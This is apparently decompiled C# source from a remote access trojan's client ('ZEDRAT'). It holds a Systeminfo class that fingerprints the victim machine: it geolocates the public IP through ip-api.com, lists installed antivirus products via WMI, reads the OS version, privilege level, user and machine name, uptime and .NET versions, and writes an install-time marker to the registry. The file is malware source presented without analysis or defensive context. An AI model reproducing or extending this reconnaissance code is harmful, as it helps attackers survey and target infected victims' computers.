using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Json;
using System.Security.Principal;
using System.Text;
using Client.ZEDRAT.Messages;
using Microsoft.Win32;
using Plugin;

namespace Client
{
	public class Systeminfo
	{
		public static GeoInformation GeoInfo { get; private set; }

		public static DateTime LastLocated { get; private set; }

		public static bool LocationCompleted { get; private set; }

		public static string Get_Country()
		{
			TimeSpan timeSpan = new TimeSpan(DateTime.UtcNow.Ticks - Systeminfo.LastLocated.Ticks);
			if (timeSpan.TotalMinutes > 30.0 || !Systeminfo.LocationCompleted)
			{
				try
				{
					Systeminfo.LocationCompleted = false;
					DataContractJsonSerializer dataContractJsonSerializer = new DataContractJsonSerializer(typeof(GeoInformation));
					HttpWebRequest obj = (HttpWebRequest)WebRequest.Create("http://ip-api.com/json/");
					obj.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0";
					obj.Proxy = null;
					obj.Timeout = 10000;
					using (HttpWebResponse httpWebResponse = (HttpWebResponse)obj.GetResponse())
					{
						using Stream stream = httpWebResponse.GetResponseStream();
						using StreamReader streamReader = new StreamReader(stream);
						string s = streamReader.ReadToEnd();
						using MemoryStream stream2 = new MemoryStream(Encoding.UTF8.GetBytes(s));
						Systeminfo.GeoInfo = (GeoInformation)dataContractJsonSerializer.ReadObject((Stream)stream2);
					}
					Systeminfo.LastLocated = DateTime.UtcNow;
					Systeminfo.LocationCompleted = true;
					return Systeminfo.GeoInfo.Country;
				}
				catch
				{
					return null;
				}
			}
			return Systeminfo.GeoInfo.Country;
		}

		public static string GetAntivirus()
		{
			try
			{
				using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
				List<string> list = new List<string>();
				foreach (ManagementBaseObject item in managementObjectSearcher.Get())
				{
					list.Add(item["displayName"].ToString());
				}
				return (list.Count == 0) ? "N/A" : (string.Join("/", list.ToArray()) ?? "Unknown");
			}
			catch
			{
				return "Unknown";
			}
		}

		public static string GetPlatformHelper()
		{
			try
			{
				string text = null;
				string text2 = null;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select * from Win32_OperatingSystem"))
				{
					using ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator();
					if (managementObjectEnumerator.MoveNext())
					{
						ManagementObject obj = (ManagementObject)managementObjectEnumerator.Current;
						text = obj["Caption"].ToString();
						text2 = obj["OSArchitecture"].ToString();
					}
				}
				return (text.Replace("Microsoft ", "") + text2).Replace(" ", "") ?? "Unknown";
			}
			catch
			{
				return "Unknown";
			}
		}

		public static string GetPrivileges()
		{
			try
			{
				IntPtr TokenHandle = IntPtr.Zero;
				IntPtr zero = IntPtr.Zero;
				IntPtr ReturnLength = IntPtr.Zero;
				_ = IntPtr.Zero;
				string result = null;
				if (NativeMethods.OpenProcessToken(Process.GetCurrentProcess().Handle, 10u, out TokenHandle))
				{
					if (!NativeMethods.GetTokenInformation(TokenHandle, 25u, zero, 0u, out ReturnLength))
					{
						IntPtr intPtr = Marshal.AllocHGlobal(ReturnLength);
						if (NativeMethods.GetTokenInformation(TokenHandle, 25u, intPtr, (uint)(int)ReturnLength, out ReturnLength))
						{
							IntPtr pSid = Marshal.ReadIntPtr(intPtr);
							result = Marshal.ReadInt32(NativeMethods.GetSidSubAuthority(pSid, (uint)(Marshal.ReadInt32(NativeMethods.GetSidSubAuthorityCount(pSid)) - 1))) switch
							{
								0 => "Untrusted", 
								4096 => "Low", 
								8192 => "Normal", 
								8448 => "Normal +", 
								12288 => "High", 
								16384 => "System", 
								_ => "unknown", 
							};
						}
						Marshal.FreeHGlobal(intPtr);
					}
					NativeMethods.CloseHandle(TokenHandle);
				}
				return result;
			}
			catch
			{
				return "unknown";
			}
		}

		public static string GetPCandUser()
		{
			try
			{
				using WindowsIdentity windowsIdentity = WindowsIdentity.GetCurrent();
				return windowsIdentity.Name ?? "Unknown";
			}
			catch
			{
				return "Unknown";
			}
		}

		public static string GetMachineName()
		{
			try
			{
				return Environment.MachineName;
			}
			catch
			{
				return "Unknown";
			}
		}

		public static string GetComputerStartTime()
		{
			try
			{
				TimeSpan timeSpan = new TimeSpan(Convert.ToInt64(Convert.ToInt64(Environment.TickCount & 0x7FFFFFFF) * 10000));
				return DateTime.Now.AddDays(timeSpan.Days).AddHours(-timeSpan.Hours).AddMinutes(-timeSpan.Minutes)
					.AddSeconds(-timeSpan.Seconds)
					.ToString() ?? "Unknown";
			}
			catch
			{
				return "Unknown";
			}
		}

		public static string GetVersionFromRegistry()
		{
			try
			{
				using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\");
				List<string> list = new List<string>();
				string[] subKeyNames = registryKey.GetSubKeyNames();
				foreach (string text in subKeyNames)
				{
					if (text == "v4" || !text.StartsWith("v"))
					{
						continue;
					}
					RegistryKey registryKey2 = registryKey.OpenSubKey(text);
					if (text.Equals("v4.0"))
					{
						registryKey2 = registryKey2.OpenSubKey("Client");
					}
					string text2 = registryKey2.GetValue("Install", "").ToString();
					if (!string.IsNullOrEmpty(text2) && text2 == "1")
					{
						if (text.StartsWith("v2"))
						{
							list.Add(text.Remove(2, text.Length - 2));
						}
						else
						{
							list.Add(text.Replace(".0", ""));
						}
					}
				}
				return string.Join("/", list.ToArray()) ?? "Unknown";
			}
			catch
			{
				return "Unknown";
			}
		}

		public static string InstallTime()
		{
			try
			{
				string pCandUser = Systeminfo.GetPCandUser();
				using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\" + pCandUser);
				string text = (string)registryKey.GetValue(pCandUser + "T", null);
				if (string.IsNullOrEmpty(text))
				{
					registryKey.SetValue(pCandUser + "T", DateTime.Now.ToString());
				}
				if (text == null)
				{
					text = DateTime.Now.ToString();
				}
				return text;
			}
			catch
			{
				return null;
			}
		}
	}
}
